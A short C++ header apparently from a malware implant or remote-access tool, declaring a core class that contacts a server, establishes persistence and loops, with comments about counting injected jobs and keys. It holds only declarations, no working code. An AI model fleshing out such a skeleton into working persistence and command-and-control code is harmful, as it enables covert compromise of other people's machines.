// core.h       --> prototype for the application core class
#pragma once

#include <string>

class Core {
    public:
        Core();
        void contact_server();
        void establish_persistence();
        void loop();
    private:
        int established_persistence_count { 0 };                // this is meant to keep track of how many different persistence methods were successful
                                                                // it does this by keeping count of how many persistence function calls return true;
                                                                // it does not keep track of how many individual jobs/keys were injected/created
};
